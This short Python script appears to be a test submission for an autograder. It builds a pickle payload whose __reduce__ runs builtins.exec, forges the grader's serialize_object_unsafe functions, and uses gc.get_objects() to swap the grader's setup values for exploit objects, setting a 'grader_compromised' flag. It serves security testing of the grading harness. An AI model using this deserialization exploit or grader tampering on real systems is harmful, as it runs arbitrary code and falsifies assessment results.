import base64
import builtins
import gc
import pickle
import sys


class Exploit:
    def __reduce__(self):
        return (builtins.exec, ("import builtins; builtins.grader_compromised = True",))


payload = base64.b64encode(pickle.dumps(Exploit())).decode()

# Forge whatever the runner would send if it serialized setup values on request.
sys.modules["__main__"].serialize_object_unsafe = lambda obj: payload
sys.modules["pytest_prairielearn_grader.utils"].serialize_object_unsafe = lambda obj: payload

# Find the setup namespace and replace its values.
for obj in gc.get_objects():
    if isinstance(obj, dict) and "add_twenty" in obj and "value" in obj:
        obj["value"] = Exploit()
        obj["add_twenty"] = Exploit()

# Rebind a global that setup functions look up when they're called.
shared = "from student"
